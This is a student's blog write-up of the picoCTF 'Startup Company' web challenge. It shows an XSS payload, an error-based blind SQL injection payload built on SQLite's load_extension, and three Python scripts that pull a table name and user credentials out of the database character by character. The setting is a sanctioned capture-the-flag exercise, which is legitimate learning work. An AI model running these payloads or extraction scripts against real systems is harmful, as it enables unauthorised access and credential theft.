+++
date = '2026-04-22'
draft = false
title = 'Pico Startup Company writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

The last challenge in my Pico Medium Web category - finally - all four pages are finished! It's been quite a while, with 12th grade and university admissions, but I'm super proud that I got to it in the end.

## Overview

Do you want to fund my startup?

---

We can register, then head over to `contribute.php` to contribute money. The request looks like `captcha=73&moneys=1`. We can send negative money but it's not that big of a deal.

## Identifying the vulnerabilities

Sending a bunch of money in the same interval of time will generate the same captcha, and quickly result in an 'Invalid Captcha' error. The hints suggest SQLite, so maybe the captcha is involved in a query.

Usually sqlmap doesn't work for me, for some reason, but this time I thought I'd give it a try anyways. No results.

I tried just removing the captcha value from the request, and it was successful! We can also send an array ([]) or text, and it gets rendered on the page.

![challenge-screenshot](abc.png#center)

By sending `moneys=<script>alert(1)</script>` we can also achieve XSS. But, these are php pages, so can we do something php specific?

![challenge-screenshot](xss.png#center)

After messing around more, I finally triggered an SQLite3 error:

![challenge-screenshot](db.png#center)

I started sending a mix of ' and ":

![challenge-screenshot](wordpass.png#center)

I looked at SQLite Error based payloads from PayloadAllTheThings - and I started using this query: `moneys=1' AND CASE WHEN [boolean] THEN 1 ELSE load_extension(1) END;--`. This is boolean based gives and will return *"Unable to execute statement: not authorized in.."* when the boolean query was false.

Using that, I found the number of tables, with the boolean query being `(SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < 2`, the last true one;  => we only have 1 table. 

Same logic, `((SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)<14)` => table name length is 13 chars long.

Then, to actually figure out the table's name, I ran this little python script:

```py
import requests
from utils.prety_print import pretty_print

url = "http://wily-courier.picoctf.net:52189/contribute.php"
cookie = {"PHPSESSID":"d88487e473ccfd64de993d1917f4f422"}

last = True

table_name = ''
#iterate through letters 1-13

for i in range(1,14):
    for c in range(ord('A'), ord('z')+1):
        substr = f"(SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('{chr(c)}')"
        qstring = f"1' AND CASE WHEN ({substr}) THEN 1 ELSE load_extension(1) END;--"
        #trimite req, daca c > 'd' true si c > 'e' fals atunci c = 'e'
        data = {
            "moneys": qstring
        }
        res = requests.post(url, data=data, cookies=cookie)
        current = False if 'not authorized' in res.text else True
        
        if last == True and current == False:
            table_name += chr(c)
            print(f"found character: {chr(c)}!")
            break
        last = current
        
print(f"full table name is {table_name}")
```

This ran for a couple of minutes, since I didn't bother using threads, but we finally got the users table name:

![challenge-screenshot](res.png#center)

I did the same thing for the admin's credentials, by updating my script:

```py
import requests
from utils.pretty_print import pretty_print

url = "http://wily-courier.picoctf.net:52189/contribute.php"
cookie = {"PHPSESSID":"d88487e473ccfd64de993d1917f4f422"}

last = True

table_name = 'startup_users'
table_len = 13
name_user = 'admin'
user_len = 5
pass_user = ''
pass_len = 8
#iterate through letters 1-13

for i in range(1,pass_len+1):
    for c in range(ord('A'), ord('z')+1):
        substr = f"(SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('{chr(c)}')"
        substr_user = f"(SELECT hex(substr(nameuser,{i},1)) FROM startup_users LIMIT 1 OFFSET 0) > HEX('{chr(c)}')"
        substr_pass = f"(SELECT hex(substr(wordpass,{i},1)) FROM startup_users LIMIT 1 OFFSET 0) > HEX('{chr(c)}')"
        qstring = f"1' AND CASE WHEN ({substr_pass}) THEN 1 ELSE load_extension(1) END;--"
        
        #trimite req, daca c > 'd' true si c > 'e' fals atunci c = 'e'
        data = {
            "moneys": qstring
        }
        res = requests.post(url, data=data, cookies=cookie)
        current = False if 'not authorized' in res.text else True
        
        if last == True and current == False:
            pass_user += chr(c)
            print(f"found character: {chr(c)}!")
            break
        last = current
        
print(f"full table name is {table_name}")
print(f"full admin name is {name_user}")
print(f"full admin pass is {pass_user}")
```

And we found that admin has the password *password*. Wow, great catch! I checked the second user, and it had a 21 letter long password, but that was something beginning with "not_the.." so I gave up.

I ended up using threads and using binary search to iterate through all of the characters faster, since I decided to just print all of them. After fixing all the issues, and printing only the 6th element, FINALLY:

![challenge-screenshot](flag.png#center)

The script is REALLY long:

```py
import requests
from utils.pretty_print import pretty_print
from concurrent.futures import ThreadPoolExecutor
import string

url = "http://wily-courier.picoctf.net:65033/contribute.php"
cookie = {"PHPSESSID":"d88487e473ccfd64de993d1917f4f422"}

characters = string.ascii_letters + string.digits + "{}_"
charset = "".join(sorted(characters))

#threads... bc wtf.

#find the table row password's len (i being OFFSET)
#binary search
def find_passlen(i):
    left = 1
    right = 50
    while(left<=right):
        m = int((left+right)/2)
        substr_len_pass = f"(SELECT length(wordpass) FROM startup_users LIMIT 1 OFFSET {i})>={m}"
        qstring = f"1' AND CASE WHEN ({substr_len_pass}) THEN 1 ELSE load_extension(1) END;--"
        data = {
            "moneys": qstring
        }
        res = requests.post(url, data=data, cookies=cookie)
        current = False if 'not authorized' in res.text else True
        if current:
            pos = m
            left = m + 1
        else:
            right = m - 1
    return pos
    
def find_userlen(i):
    left = 1
    right = 30
    while(left<=right):
        m = int((left+right)/2)
        substr_len_pass = f"(SELECT length(nameuser) FROM startup_users LIMIT 1 OFFSET {i})>={m}"
        qstring = f"1' AND CASE WHEN ({substr_len_pass}) THEN 1 ELSE load_extension(1) END;--"
        data = {
            "moneys": qstring
        }
        res = requests.post(url, data=data, cookies=cookie)
        current = False if 'not authorized' in res.text else True
        if current:
            pos = m
            left = m + 1
        else:
            right = m - 1
    return pos
    
def find_passchar(i, k):
#find entry k's letter i of the password
    left = 0
    right = len(charset) - 1
    while(left<=right):
        m = int((left+right)/2)
        c = charset[m]
        substr_pass = f"(SELECT hex(substr(wordpass,{i},1)) FROM startup_users LIMIT 1 OFFSET {k}) >= HEX('{c}')"
        qstring = f"1' AND CASE WHEN ({substr_pass}) THEN 1 ELSE load_extension(1) END;--"
        data = {
            "moneys": qstring
        }
        res = requests.post(url, data=data, cookies=cookie)
        current = False if 'not authorized' in res.text else True
        
        if current:
            pos = c
            left = m+1
        else:
            right=m-1
    return pos
    
def find_userchar(i, k):
#find entry k's letter i of the password
    left = 0
    right = len(charset) - 1
    while(left<=right):
        m = int((left+right)/2)
        c = charset[m]
        substr_pass = f"(SELECT hex(substr(nameuser,{i},1)) FROM startup_users LIMIT 1 OFFSET {k}) >= HEX('{c}')"
        qstring = f"1' AND CASE WHEN ({substr_pass}) THEN 1 ELSE load_extension(1) END;--"
        data = {
            "moneys": qstring
        }
        res = requests.post(url, data=data, cookies=cookie)
        current = False if 'not authorized' in res.text else True
        
        if current:
            pos = c
            left = m+1
        else:
            right=m-1
    return pos
    
def find_pass_user(k):
    #first find len, then for each char of the len have a thread find it
    #we have 8 entries
    passlen = find_passlen(k)
    userlen = find_userlen(k)
    print(f"Found password length {passlen} and username length {userlen} for {k}th user.")
    with ThreadPoolExecutor(max_workers=30) as executor:
        results_pass = list(executor.map(lambda i: find_passchar(i, k), range(1, passlen+1)))
        results_user = list(executor.map(lambda i: find_userchar(i, k), range(1, userlen+1)))
    password = ''.join(results_pass)
    username = ''.join(results_user)
    print(f"Found password {password} and {username} for the {k}th user.")
    
    
#for each user, make a thread; dar user merge de la k, indexat de la 0

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(find_pass_user, range(0,8))
```

---

I looked at some other writeups, and I realised this was *not* that complicated to solve, and that we could get the server to print rows itself, by sending `moneys='||sqlite_version()'`. Either way, I feel like doing this myself was a great learning experience and I got to remind myself about binary search, lol.

